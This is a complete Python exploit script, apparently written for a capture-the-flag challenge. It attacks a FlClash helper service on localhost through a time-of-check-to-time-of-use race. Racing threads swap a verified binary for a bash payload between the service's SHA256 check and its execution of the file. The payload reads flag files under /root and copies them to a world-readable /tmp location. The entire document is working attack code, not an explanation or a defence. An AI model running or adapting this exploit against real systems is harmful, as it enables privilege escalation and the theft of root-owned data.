#!/usr/bin/env python3
"""
TOCTOU Exploit - Improved File Replacement with fsync

Ensures files are fully written before replacement to avoid partial reads during SHA256 check.
"""

import os
import sys
import time
import threading
import multiprocessing
import requests
import json
import shutil

# Configuration
HELPER_API = "http://127.0.0.1:47890"
TARGET_PATH = "/tmp/exploit_target"
LEGITIMATE_FILE = "/tmp/FlClashCore"
PAYLOAD_ARG = "-h"

def create_payload():
    """Create a payload that reads flag and writes to accessible location"""
    payload_path = "/tmp/payload.sh"

    payload = r"""#!/bin/bash
# Find and copy all flag files from /root to /tmp
find /root -name "flag_*" -exec cat {} \; > /tmp/flag_output 2>&1
chmod 777 /tmp/flag_output
"""

    with open(payload_path, 'w') as f:
        f.write(payload)
        f.flush()
        os.fsync(f.fileno())  # Ensure written to disk

    os.chmod(payload_path, 0o755)
    print(f"[+] Created payload at {payload_path}")
    return payload_path

def safe_copy(src, dst):
    """Copy file and ensure it's fully written"""
    # Copy to temp file first
    temp_dst = dst + ".tmp"
    with open(src, 'rb') as fsrc:
        with open(temp_dst, 'wb') as fdst:
            shutil.copyfileobj(fsrc, fdst)
            fdst.flush()
            os.fsync(fdst.fileno())  # Force write to disk

    # Atomic rename
    os.rename(temp_dst, dst)

def race_worker(payload_path, stop_event):
    """Worker that repeatedly replaces file content"""
    counter = 0
    while not stop_event.is_set():
        try:
            # Copy legitimate file completely (for SHA256 check to pass)
            safe_copy(LEGITIMATE_FILE, TARGET_PATH)
            os.chmod(TARGET_PATH, 0o755)

            # Wait for SHA256 check to complete
            time.sleep(0.002)  # 2ms - allow time for SHA256 calculation

            # Replace with payload (for execution phase)
            safe_copy(payload_path, TARGET_PATH)
            os.chmod(TARGET_PATH, 0o755)

            # Keep it stable for execution
            time.sleep(0.003)  # 3ms

            counter += 1
            if counter % 50 == 0:
                print(f"[Race] Attempts: {counter}")

        except Exception as e:
            # Ignore errors and keep racing
            pass

def race_process(payload_path):
    """Process that runs racing threads"""
    print("[Race] Starting race condition threads...")
    print("[Race] Using fsync to ensure complete file writes")

    stop_event = threading.Event()
    threads = []

    # Use fewer threads to reduce I/O contention
    for i in range(5):
        t = threading.Thread(target=race_worker, args=(payload_path, stop_event), daemon=True)
        t.start()
        threads.append(t)

    print(f"[Race] Started {len(threads)} racing threads")

    # Keep racing until parent terminates us
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()

def trigger_process():
    """Process that repeatedly triggers the helper API"""
    print("[Trigger] Starting API trigger...")

    time.sleep(0.5)  # Give race threads time to start

    attempt = 0
    while True:
        attempt += 1

        if attempt % 10 == 0:
            print(f"[Trigger] Attempt {attempt}")

        payload = {
            "path": TARGET_PATH,
            "arg": PAYLOAD_ARG
        }

        try:
            response = requests.post(
                f"{HELPER_API}/start",
                json=payload,
                timeout=1.0  # Longer timeout
            )
            if response.text and "SHA256" not in response.text:
                # Only print if not hash error
                print(f"[Trigger] Response: {response.text}")
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            pass

        time.sleep(0.02)  # Match race timing

def monitor_process():
    """Process that monitors for successful exploitation"""
    print("[Monitor] Watching for flag output...")

    while True:
        time.sleep(0.5)

        if os.path.exists("/tmp/flag_output"):
            print("\n" + "=" * 60)
            print("[+] SUCCESS! Flag captured!")
            print("=" * 60)

            try:
                with open("/tmp/flag_output", "r") as f:
                    flag = f.read()
                print("\nFLAG CONTENT:")
                print(flag)
                print("=" * 60)
            except Exception as e:
                print(f"[!] Error reading flag: {e}")

            sys.exit(0)

def main():
    print("=" * 60)
    print("FlClash TOCTOU Exploit - Improved File Replacement")
    print("=" * 60)
    print()

    # Check prerequisites
    if not os.path.exists(LEGITIMATE_FILE):
        print(f"[!] Error: {LEGITIMATE_FILE} not found")
        print("[!] Make sure FlClashCore is available in /tmp")
        sys.exit(1)

    # Verify the legitimate file hash
    import hashlib
    with open(LEGITIMATE_FILE, 'rb') as f:
        file_hash = hashlib.sha256(f.read()).hexdigest()
    print(f"[*] FlClashCore SHA256: {file_hash}")

    # Clean up
    for path in [TARGET_PATH, TARGET_PATH + ".tmp", "/tmp/flag_output", "/tmp/payload.sh"]:
        try:
            os.unlink(path)
        except FileNotFoundError:
            pass

    # Create payload
    payload_path = create_payload()

    print("\n[*] Starting exploitation processes...")
    print("[*] Using atomic file operations with fsync")
    print("[*] This will run until the flag is captured (Ctrl+C to stop)\n")

    # Start all processes
    processes = []

    # Race condition process
    p_race = multiprocessing.Process(target=race_process, args=(payload_path,), daemon=True)
    p_race.start()
    processes.append(("Race", p_race))

    # Trigger process
    p_trigger = multiprocessing.Process(target=trigger_process, daemon=True)
    p_trigger.start()
    processes.append(("Trigger", p_trigger))

    # Monitor for success
    try:
        monitor_process()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    finally:
        # Clean up processes
        for name, proc in processes:
            if proc.is_alive():
                proc.terminate()
                proc.join(timeout=1)

if __name__ == "__main__":
    main()
